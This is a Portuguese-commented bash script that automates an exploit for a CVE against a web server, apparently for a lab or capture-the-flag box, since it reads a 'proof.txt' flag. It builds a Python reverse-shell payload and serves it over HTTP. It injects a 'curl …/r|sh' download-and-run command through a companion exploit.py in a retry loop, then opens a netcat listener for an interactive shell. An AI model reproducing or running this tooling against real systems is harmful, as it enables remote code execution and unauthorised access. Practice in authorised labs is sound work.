#!/bin/bash
# run_shell.sh — CVE-2026-109618 → Reverse Shell automatizado
#
# Uso:
#   ./run_shell.sh                    → usa $IP ou 192.168.127.10
#   ./run_shell.sh <target> [porta]   → target e porta específicos
#
# Requisitos: exploit.py no mesmo diretório, python3, nc
#
# O script faz tudo sozinho:
#   1. Detecta o IP do Kali
#   2. Gera payload de reverse shell com retry
#   3. Sobe HTTP server para servir o payload
#   4. Roda o exploit em loop até ter sucesso (detecta via log do HTTP)
#   5. Abre nc interativo — o shell aparece no terminal

set -u

TARGET="${1:-${IP:-192.168.127.10}}"
TPORT="${2:-80}"
LPORT=4444
SPORT=8080
MAX_ATTEMPTS=15

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT="$SCRIPT_DIR/exploit.py"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ─── Verificações ────────────────────────────────────────────
if [ ! -f "$EXPLOIT" ]; then
    echo -e "${RED}[!] exploit.py não encontrado em $SCRIPT_DIR${NC}"
    exit 1
fi

if ! command -v nc &>/dev/null; then
    echo -e "${RED}[!] nc (netcat) não instalado${NC}"
    exit 1
fi

# ─── Detecta IP do Kali ─────────────────────────────────────
LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
        ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' || \
        echo "")

if [ -z "$LHOST" ]; then
    echo -e "${RED}[!] Não consegui detectar IP do Kali (tun0/eth0)${NC}"
    exit 1
fi

# ─── Verifica target acessível ───────────────────────────────
echo -e "${CYAN}[*]${NC} Testando conexão com $TARGET:$TPORT..."
if ! curl -s --max-time 5 -o /dev/null "http://$TARGET:$TPORT/"; then
    echo -e "${RED}[!] Target $TARGET:$TPORT inacessível${NC}"
    exit 1
fi
echo -e "${GREEN}[+]${NC} Target acessível"

# ─── Setup temporário ────────────────────────────────────────
TMP=$(mktemp -d)
cleanup() {
    kill $(jobs -p) 2>/dev/null
    wait 2>/dev/null
    rm -rf "$TMP"
}
trap cleanup EXIT

# ─── Gera payload de reverse shell ───────────────────────────
# O payload tenta conectar 10x com intervalo de 1s.
# Assim o nc tem tempo de subir entre a detecção e a conexão.
cat > "$TMP/r" << PAYLOAD
python3 -c "
import socket,subprocess,os,time
for _ in range(10):
 try:
  s=socket.socket();s.connect(('$LHOST',$LPORT))
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
  subprocess.call(['/bin/sh','-i']);break
 except:time.sleep(1)
"
PAYLOAD

# ─── Sobe HTTP server (silencioso, com log) ──────────────────
(cd "$TMP" && python3 -m http.server "$SPORT") > "$TMP/http.log" 2>&1 &
HTTP_PID=$!
sleep 1

if ! kill -0 "$HTTP_PID" 2>/dev/null; then
    echo -e "${RED}[!] Falha ao subir HTTP server na porta $SPORT${NC}"
    exit 1
fi

# ─── Banner ──────────────────────────────────────────────────
RCE_CMD="curl $LHOST:$SPORT/r|sh"
RCE_LEN=${#RCE_CMD}

echo ""
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  CVE-2026-109618 → Reverse Shell${NC}"
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo ""
echo -e "  Target:    ${BOLD}$TARGET:$TPORT${NC}"
echo -e "  Callback:  ${BOLD}$LHOST:$LPORT${NC}"
echo -e "  Payload:   ${BOLD}$RCE_CMD${NC} ($RCE_LEN bytes / 48 max)"
echo ""

if [ "$RCE_LEN" -gt 48 ]; then
    echo -e "${RED}[!] Payload excede 48 bytes! Ajuste IP/porta.${NC}"
    exit 1
fi

# ─── Exploit loop com detecção automática ────────────────────
echo -e "${YELLOW}[*]${NC} Rodando exploit (até $MAX_ATTEMPTS tentativas)..."
echo ""

SUCCESS=0
for i in $(seq 1 $MAX_ATTEMPTS); do
    printf "  [%2d/%d] " "$i" "$MAX_ATTEMPTS"

    python3 "$EXPLOIT" \
        --host "$TARGET" --port "$TPORT" \
        --rce "$RCE_CMD" \
        &> "$TMP/exploit_$i.log"

    # Verifica se o HTTP server recebeu GET /r (= target baixou o payload)
    if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
        echo -e "${GREEN}EXPLOIT DEU CERTO!${NC}"
        SUCCESS=1
        break
    fi

    # Feedback baseado na saída do exploit
    LAST=$(tail -1 "$TMP/exploit_$i.log" 2>/dev/null)
    if echo "$LAST" | grep -q "normal-size cookie"; then
        echo -e "leak falhou ${YELLOW}(cookie normal)${NC}"
    elif echo "$LAST" | grep -q "RuntimeError\|Traceback"; then
        echo -e "${RED}erro (target se recuperando)${NC}"
    elif echo "$LAST" | grep -q "response=0"; then
        echo "RCE enviado, verificando..."
        sleep 3
        if grep -q "GET /r" "$TMP/http.log" 2>/dev/null; then
            echo -e "  ${GREEN}EXPLOIT DEU CERTO!${NC}"
            SUCCESS=1
            break
        fi
    elif echo "$LAST" | grep -q "candidates=0"; then
        echo -e "leak falhou ${YELLOW}(sem candidates)${NC}"
    else
        echo "sem sucesso"
    fi

    sleep 2
done

if [ $SUCCESS -eq 0 ]; then
    echo ""
    echo -e "${RED}[-] $MAX_ATTEMPTS tentativas esgotadas.${NC}"
    echo "    Verifique: curl http://$TARGET:$TPORT/"
    echo "    O target pode precisar de reinício."
    exit 1
fi

# ─── Reverse shell conectando ────────────────────────────────
echo ""
echo -e "${GREEN}════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  REVERSE SHELL CONECTANDO...${NC}"
echo -e "${GREEN}════════════════════════════════════════════════${NC}"
echo ""
echo -e "  Comandos úteis:"
echo -e "    ${BOLD}whoami${NC}                   → usuário no target"
echo -e "    ${BOLD}id${NC}                       → uid/gid"
echo -e "    ${BOLD}hostname${NC}                 → nome do servidor"
echo -e "    ${BOLD}cat /var/www/proof.txt${NC}   → flag"
echo -e "    ${BOLD}uname -a${NC}                 → kernel"
echo ""

# nc listener em foreground — interativo
nc -lvnp $LPORT

echo ""
echo -e "${CYAN}[*]${NC} Shell encerrado."
